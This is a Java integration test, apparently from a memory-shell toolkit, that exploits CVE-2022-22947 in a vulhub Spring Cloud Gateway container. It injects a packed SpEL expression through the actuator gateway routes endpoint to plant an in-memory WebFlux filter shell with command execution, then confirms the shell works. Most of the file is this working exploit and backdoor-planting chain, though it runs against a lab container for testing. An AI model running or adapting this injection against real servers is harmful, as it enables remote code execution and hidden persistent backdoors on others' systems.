package com.reajason.javaweb.integration.memshell.springwebflux;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.tuple.Pair;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.time.Duration;

import static org.junit.jupiter.api.Assertions.assertNotEquals;

@Testcontainers
@Slf4j
public class CVE202222947Test {

    @Container
    public static final GenericContainer<?> cve202222947 =
            new GenericContainer<>("vulhub/spring-cloud-gateway:3.1.0")
                    .withExposedPorts(8080)
                    .waitingFor(Wait.forHttp("/")
                            .withStartupTimeout(Duration.ofMinutes(3)));

    @Test
    @DisplayName("CVE-2022-22947")
    void CVE_2022_22947() {
        String url = getUrl();
        String shellType = ShellType.SPRING_WEBFLUX_WEB_FILTER;
        String shellTool = ShellTool.Command;
        Packers packer = Packers.SpELSpringGzip;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(
                urls.getRight(),
                Server.SpringWebFlux,
                null,
                shellType,
                shellTool,
                Opcodes.V1_8,
                shellToolConfig,
                packer);

        String content = packer.getInstance().pack(generateResult.toClassPackerConfig());
        injectBySpringCloudGateway(url, content);
        ShellAssertion.assertShellIsOk(generateResult, urls.getLeft(), shellTool, shellType, null, null);
    }

    @SneakyThrows
    private void injectBySpringCloudGateway(String url, String expression) {
        String routeId = "memshell" + RandomStringUtils.randomAlphabetic(8);
        String routeUrl = url + "/actuator/gateway/routes/" + routeId;
        try {
            String body = """
                    {
                      "id": "%s",
                      "filters": [{
                        "name": "AddResponseHeader",
                        "args": {
                          "name": "Result",
                          "value": "#{%s}"
                        }
                      }],
                      "uri": "http://example.com"
                    }
                    """.formatted(routeId, expression);
            post(routeUrl, body, MediaType.parse("application/json"));
            post(url + "/actuator/gateway/refresh", "", null);
        } finally {
            deleteQuietly(routeUrl);
            postQuietly(url + "/actuator/gateway/refresh");
        }
    }

    @SneakyThrows
    private static void post(String url, String body, MediaType mediaType) {
        Request request = new Request.Builder()
                .url(url)
                .post(RequestBody.create(body, mediaType))
                .build();
        try (Response response = new okhttp3.OkHttpClient().newCall(request).execute()) {
            assertNotEquals(404, response.code());
        }
    }

    @SneakyThrows
    private static void postQuietly(String url) {
        Request request = new Request.Builder()
                .url(url)
                .post(RequestBody.create("", null))
                .build();
        try (Response ignored = new okhttp3.OkHttpClient().newCall(request).execute()) {
        }
    }

    @SneakyThrows
    private static void deleteQuietly(String url) {
        Request request = new Request.Builder()
                .url(url)
                .delete()
                .build();
        try (Response ignored = new okhttp3.OkHttpClient().newCall(request).execute()) {
        }
    }

    private static String getUrl() {
        String host = cve202222947.getHost();
        int port = cve202222947.getMappedPort(8080);
        String url = "http://" + host + ":" + port;
        log.info("container started, app url is : {}", url);
        return url;
    }
}
